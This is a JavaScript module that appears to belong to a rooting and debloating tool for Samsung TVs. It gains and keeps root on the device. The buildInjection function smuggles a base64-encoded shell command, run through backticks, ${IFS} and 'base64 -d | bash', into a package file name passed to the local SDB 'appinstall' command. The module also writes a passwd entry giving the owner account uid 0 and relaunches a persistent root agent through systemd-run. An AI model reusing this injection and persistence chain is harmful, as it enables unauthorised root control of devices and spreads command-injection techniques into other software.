'use strict';
// Optional TV platform adapter. App code knows only start/stop/status/execute/install.
var fs = require('fs');
var path = require('path');
var crypto = require('crypto');
var sdb = require('./sdb.js');
var tarGz = require('./tar.js').tarGz;
var RootAgentServer = require('./root-agent.js').RootAgentServer;
var debloatCommands = require('./debloat-commands.js');
var STAGE = '/home/owner/share/tmp/sdk_tools';

var state = {
    when: new Date().toISOString(),
    self: selfIdentity(),
    attempts: [],
    prepared: false,
    running: false,
    agent: { connected: false }
};

function selfIdentity() {
    var status = '';
    try { status = fs.readFileSync('/proc/self/status', 'utf8'); } catch (e) { }
    function field(n) { var m = status.match(new RegExp('^' + n + ':\\s*(.*)$', 'm')); return m ? m[1].trim() : null; }
    var smack = null;
    try { smack = fs.readFileSync('/proc/self/attr/current', 'utf8').trim(); } catch (e) { }
    return { pid: process.pid, uid: (typeof process.getuid === 'function') ? process.getuid() : null,
        cap_eff: field('CapEff'), smack: smack, node: process.version || null };
}

function buildInjection(command) {
    // One gate per attempt: SDB may deliver an attempt twice, but a later
    // relaunch must not inherit a gate left by an earlier agent lifetime.
    var gate = crypto.randomBytes(8).toString('hex');
    var script = '/bin/mkdir /tmp/s-' + gate + ' 2>/dev/null&&{ ' + command + ';}';
    var b64 = Buffer.from(script, 'utf8').toString('base64');
    return 'new2.tpk`printf${IFS}%s${IFS}' + b64 + '|base64${IFS}-d|bash`.tpk';
}

var pkg = 'archive-root-' + Array.from(crypto.randomBytes(8)).map(function (b) { return b.toString(16).padStart(2, '0'); }).join('');

function ensureDir(p) {
    fs.mkdirSync(p, { recursive: true });
    return p;
}

// Start the agent with detached standard streams so the archive launcher
// returns and releases SDB command processing. setsid() in the agent alone
// does not release the waiting tar/archive parents. Paths are baked in once.
//
// Optional: run the agent in a transient systemd unit of its own (the dock uses the same
// mechanism). As a plain child of the archive launcher it lives in sdbd's cgroup, which the TV
// stops at every standby, so root is lost and reacquired from this side and the remapped remote
// stays native until that finishes. A unit keeps the agent and everything it starts across a
// standby. This is opt-in: create /opt/usr/home/owner/share/vetro-agent-unit (or
// /tmp/vetro-agent-unit) and restart the service. The direct start, exactly as before, is the
// default and the fallback: the marker is absent, systemd-run is missing or refuses, or the agent
// reports a SMACK label/capability set other than the archive chain's (platform.js then writes
// /tmp/vetro-agent-direct so later launches in this boot stay direct).
function buildLaunchScript(agentPort) {
    var staging = STAGE + '/' + pkg;
    var command = '/usr/bin/dotnet ' + staging + '/SamsungTvRootAgent.dll ' +
        '127.0.0.1 ' + agentPort + ' ' + staging + '/root-agent.token ' + staging;
    return '#!/bin/sh\n' +
        'AGENT="' + command + '"\n' +
        'if { [ -e /opt/usr/home/owner/share/vetro-agent-unit ] || [ -e /tmp/vetro-agent-unit ]; } ' +
        '&& [ ! -e /tmp/vetro-agent-direct ] && systemd-run --unit=vetro-root --collect ' +
        '-p KillSignal=SIGKILL -p StandardOutput=null -p StandardError=null ' +
        '-p SmackProcessLabel=User /bin/sh -c "$AGENT" >/dev/null 2>&1; then\n' +
        '  exit 0\n' +
        'fi\n' +
        '$AGENT </dev/null >' + staging + '/root-agent.log 2>&1 &\n';
}

// Every service start stages a new archive-root-<id> folder and a signed archive in on-demand/, and nothing
// removed the earlier ones (150+ folders, ~10 MB on a nearly full /opt after a few weeks). The current one and
// the newest few others stay, and so does any folder a running process still has on its command line.
var STAGE_KEEP = 3;
function stageInUse() {
    var used = '';
    try {
        fs.readdirSync('/proc').forEach(function (d) {
            if (!/^\d+$/.test(d)) return;
            try { used += fs.readFileSync('/proc/' + d + '/cmdline', 'utf8') + '\n'; } catch (e) {}
        });
    } catch (e) {}
    return used;
}
// Node 12 on the TV has no fs.rmSync.
function removeTree(p) {
    var st = fs.lstatSync(p);
    if (st.isDirectory()) {
        fs.readdirSync(p).forEach(function (n) { removeTree(p + '/' + n); });
        fs.rmdirSync(p);
    } else fs.unlinkSync(p);
}
function cleanStage(keep) {
    var removed = [];
    var onDemand = STAGE + '/on-demand';
    var used = stageInUse();
    var dirs = fs.readdirSync(STAGE).filter(function (n) {
        return /^archive-root-[0-9a-f]{16}$/.test(n) && n !== keep;
    }).map(function (n) {
        var t = 0;
        try { t = fs.statSync(STAGE + '/' + n).mtimeMs; } catch (e) {}
        return { name: n, time: t };
    }).sort(function (a, b) { return b.time - a.time; });
    var spared = {};
    spared[keep] = true;
    dirs.forEach(function (d, i) {
        if (i < STAGE_KEEP - 1 || used.indexOf(d.name) >= 0) { spared[d.name] = true; return; }
        try { removeTree(STAGE + '/' + d.name); removed.push(d.name); } catch (e) {}
    });
    // Archives in on-demand/ whose folder is gone (or never existed) have no use.
    try {
        fs.readdirSync(onDemand).forEach(function (n) {
            var m = /^(archive-root-[0-9a-f]{16})\.tar\.gz(\.signature)?$/.exec(n);
            if (m && !spared[m[1]]) { try { fs.unlinkSync(onDemand + '/' + n); } catch (e) {} }
        });
    } catch (e) {}
    return removed;
}

function prepare(agentPort) {
    var staging = ensureDir(STAGE + '/' + pkg);
    var onDemand = ensureDir(STAGE + '/on-demand');

    var keys = crypto.generateKeyPairSync('rsa', { modulusLength: 2048 });
    var publicPem = keys.publicKey.export({ type: 'spki', format: 'pem' });
    var privatePem = keys.privateKey.export({ type: 'pkcs8', format: 'pem' });

    var bundle = path.join(__dirname, '..', 'payload');
    var names = [
        'SamsungTvArchiveRoot.dll', 'SamsungTvArchiveRoot.runtimeconfig.json', 'SamsungTvArchiveRoot.deps.json',
        'SamsungTvRootAgent.dll', 'SamsungTvRootAgent.runtimeconfig.json', 'SamsungTvRootAgent.deps.json'
    ];
    names.forEach(function (n) {
        fs.writeFileSync(path.join(staging, n), fs.readFileSync(path.join(bundle, n)));
    });

    fs.writeFileSync(path.join(staging, 'public.pem'), publicPem);
    fs.writeFileSync(path.join(staging, 'passwd'), 'owner:x:0:0:owner:/home/owner:/bin/sh\n');

    var launch = buildLaunchScript(agentPort);
    var tarBuf = tarGz([{ name: 'launch.sh', data: launch, mode: 0o700, mtime: 0 }]);
    var signature = crypto.sign('RSA-SHA256', tarBuf, privatePem);

    fs.writeFileSync(path.join(onDemand, pkg + '.tar.gz'), tarBuf);
    fs.writeFileSync(path.join(onDemand, pkg + '.tar.gz.signature'), signature);

    // Housekeeping only: a failure here must never fail the preparation.
    var removed = 0;
    try { removed = cleanStage(pkg).length; } catch (e) {}
    state.prepared = true;
    state.staging = { pkg: pkg, dir: staging, onDemand: path.join(onDemand, pkg + '.tar.gz'), removedOld: removed };
}

// --- root agent lifecycle -------------------------------------------------
var secret = crypto.randomBytes(32);
var secretB64 = secret.toString('base64');
var agentServer = null;
var agentConnected = false;
var launchClient = null;   // temporary SDB connection during launch
var launching = false;
var relaunchTimer = null;
var launchGen = 0;        // invalidates stale retry timers
// The TV stops sdbd at every standby, which drops the agent. The first retry therefore has to
// be quick: at wake sdbd may need a moment to listen, and a fixed 8 s wait put every remapped
// key back on the TV's own handling. The delay doubles only while sdbd stays away.
var RELAUNCH_FIRST_MS = 500, RELAUNCH_MAX_MS = 8000;
var relaunchDelay = RELAUNCH_FIRST_MS;
// The launch script can start the agent in a systemd unit so it survives a standby. Off unless a
// marker asks for it: the root agent is the archive chain, and the project's root is deliberately
// volatile, so the unit path is an experiment to test on one TV, not the default. The direct start
// is also selected for the rest of the boot after a failed unit start (see useDirectLaunch).
var AGENT_UNIT_MARKERS = ['/opt/usr/home/owner/share/vetro-agent-unit', '/tmp/vetro-agent-unit'];
var DIRECT_MARKER = '/tmp/vetro-agent-direct';
function agentUnitRequested() {
    for (var i = 0; i < AGENT_UNIT_MARKERS.length; i++) {
        try { if (fs.existsSync(AGENT_UNIT_MARKERS[i])) return true; } catch (e) {}
    }
    return false;
}
var systemdAgent = agentUnitRequested();
// CHOWN, DAC_OVERRIDE, DAC_READ_SEARCH, SETGID, SETUID, SYS_ADMIN: the archive chain and the
// commands it runs need these, and a unit that drops them would look connected but fail later.
var REQUIRED_CAPS = [0, 1, 2, 6, 7, 21];
function hasRootCaps(hex) {
    var mask = parseInt(hex, 16);
    if (!/^[0-9a-f]+$/i.test(String(hex || '')) || !isFinite(mask)) return false;
    for (var i = 0; i < REQUIRED_CAPS.length; i++) if (!(mask & (1 << REQUIRED_CAPS[i]))) return false;
    return true;
}
function useDirectLaunch() {
    if (!systemdAgent) return;
    systemdAgent = false;
    state.agentLaunch = 'direct';
    try { fs.writeFileSync(DIRECT_MARKER, '1\n'); } catch (e) {}
}

function pushAttempt(entry) {
    state.attempts.push(entry);
    if (state.attempts.length > 40) state.attempts.shift();
}

function startAgent() {
    if (state.running) return;
    state.running = true;
    state.agentLaunch = systemdAgent ? 'unit-preferred' : 'direct';
    agentServer = new RootAgentServer({
        secret: secret,
        onConnect: function (conn) {
            if (!state.running) { conn._socket.destroy(); return; }
            // The archive chain gives the agent the User SMACK label and root's capabilities.
            // A unit-started agent with anything less runs under a policy this project has not
            // verified, so drop it and use the direct start for the rest of the boot.
            if (systemdAgent && (conn.identity.smack !== 'User' || !hasRootCaps(conn.identity.cap_eff))) {
                useDirectLaunch();
                if (agentServer) agentServer.note('agent label "' + (conn.identity.smack || '?') + '" caps ' + (conn.identity.cap_eff || '?') + '; using the direct launch');
                try { conn._socket.destroy(); } catch (e) {}
                scheduleRelaunch();
                return;
            }
            if (relaunchTimer) { clearTimeout(relaunchTimer); relaunchTimer = null; }
            relaunchDelay = RELAUNCH_FIRST_MS;
            agentConnected = true;
            state.agent = {
                connected: true,
                pid: conn.identity.pid,
                uid: conn.identity.uid,
                gid: conn.identity.gid,
                cap_eff: conn.identity.cap_eff,
                smack: conn.identity.smack,
                at: Date.now()
            };
            pushAttempt({ t: Date.now(), phase: 'agent-connected', output: 'uid=' + conn.identity.uid + ' cap=' + conn.identity.cap_eff });
            persist();
            // The agent has detached; release any remaining launch connection.
            if (launchClient) { try { sdb.close(launchClient); } catch (e) {} launchClient = null; }
        },
        onClose: function () {
            agentConnected = false;
            state.agent = { connected: false };
            if (launchClient) { try { sdb.close(launchClient); } catch (e) {} launchClient = null; }
            persist();
            scheduleRelaunch();
        }
    });

    agentServer.start(function (port) {
        if (!state.running) return;
        state.agentPort = port;
        try { prepare(port); } catch (e) { state.prepareError = String(e.message || e); }
        relaunch();
    });
}

function scheduleRelaunch() {
    if (!state.running || relaunchTimer) return;
    var delay = relaunchDelay;
    relaunchDelay = Math.min(relaunchDelay * 2, RELAUNCH_MAX_MS);
    relaunchTimer = setTimeout(function () {
        relaunchTimer = null;
        relaunch();
    }, delay);
}

function relaunch() {
    if (launching || agentConnected || !agentServer || !state.running) return;
    launching = true;
    var gen = ++launchGen;

    // kill any previous hanging injection before starting a new one, so two
    // archive-root chains never run at once (they share the staging dir and
    // the single token)
    if (launchClient) { try { sdb.close(launchClient); } catch (e) {} launchClient = null; }

    // if the first prepare failed (e.g. staging not writable early at boot),
    // retry it with the already-assigned agent port
    if (!state.prepared && state.agentPort) {
        try { prepare(state.agentPort); } catch (e) { state.prepareError = String(e.message || e); }
    }

    if (!state.prepared) {
        launching = false;
        persist();
        scheduleRelaunch();
        return;
    }
    delete state.prepareError;
    // A missing token is a preparation failure, never a launchable state.
    try {
        fs.writeFileSync(STAGE + '/' + pkg + '/root-agent.token', secretB64 + '\n', { mode: 0o600 });
    } catch (e) {
        launching = false;
        state.prepareError = String(e.message || e);
        persist();
        scheduleRelaunch();
        return;
    }

    var launchCmd = '/usr/bin/dotnet ' + STAGE + '/' + pkg + '/SamsungTvArchiveRoot.dll ' + pkg;
    var injection = buildInjection(launchCmd);

    var entry = { t: Date.now(), phase: 'launch' };
    pushAttempt(entry);

    sdb.connect({ host: '127.0.0.1', port: 26101, timeout: 8000 })
        .then(function (client) {
            if (!state.running || gen !== launchGen) { sdb.close(client); launching = false; return; }
            launchClient = client;
            entry.connect = 'ok';
            // The launch script returns independently of the agent lifetime.
            // Release this connection on agent connect as an additional safeguard.
            sdb.exec(client, 'shell:0 appinstall tpk ' + injection, { timeout: 60000 })
                .then(function (out) { entry.output = out; })
                .catch(function (e) { entry.err = String(e.message || e); });
            launching = false;
            // if the agent has not connected within 30s, retry — but only if
            // this launch is still the current one (no newer relaunch started)
            setTimeout(function () {
                if (gen !== launchGen || agentConnected || launching) return;
                // systemd-run may return success and the unit still fail before the agent
                // connects. Give the direct start the next attempt rather than repeating it.
                useDirectLaunch();
                relaunch();
            }, 30000);
        })
        .catch(function (e) {
            launching = false;
            launchClient = null;
            entry.connect = 'fail:' + (e.code || 'error');
            entry.err = String(e.message || e);
            persist();
            scheduleRelaunch();
        });
}

function persist() {
    try { fs.appendFileSync('/opt/usr/home/owner/share/vetro.jsonl', JSON.stringify(state) + '\n'); } catch (e) {}
    try { fs.appendFileSync('/tmp/vetro.jsonl', JSON.stringify(state) + '\n'); } catch (e) {}
}

function agentExecute(cmd, timeoutMs) {
    if (!agentServer || !agentConnected) {
        var missing = new Error('no root agent connected');
        missing.code = 'no-root-agent';
        return Promise.reject(missing);
    }
    return agentServer.execute(cmd, timeoutMs || 30000);
}

function status() {
    return Object.assign({}, state, { mode: 'tv-integration', agentLog: agentServer ? agentServer.log : [] });
}
function stop() {
    state.running = false;
    ++launchGen;
    if (relaunchTimer) clearTimeout(relaunchTimer);
    relaunchTimer = null;
    if (launchClient) sdb.close(launchClient);
    launchClient = null;
    if (agentServer) agentServer.close();
    agentServer = null;
    agentConnected = false;
    launching = false;
    state.agent = {connected: false};
}
function install(packageId, wgtPath) {
    if (!/^[A-Za-z0-9_.-]{1,128}$/.test(packageId) || !/^\/[A-Za-z0-9_./-]+\.wgt$/.test(wgtPath)) {
        return Promise.reject(new Error('invalid package ID or WGT path'));
    }
    var dispatched = false;
    return sdb.connect({host: '127.0.0.1', port: 26101, timeout: 8000}).then(function (client) {
        dispatched = true;
        return sdb.exec(client, 'shell:0 vd_appinstall ' + packageId + ' ' + wgtPath, {timeout: 120000})
            .finally(function () {sdb.close(client);});
    }).catch(function (error) {
        error.submitted = dispatched ? null : false;
        throw error;
    });
}
function setApplicationsEnabled(appIds, enabled) {
    try {
        var command = enabled ? debloatCommands.enableCommand(appIds) : debloatCommands.disableCommand(appIds);
        return agentExecute(command, 60000);
    } catch (error) { return Promise.reject(error); }
}
module.exports = {start: startAgent, stop: stop, status: status, execute: agentExecute,
    install: install, setApplicationsEnabled: setApplicationsEnabled};
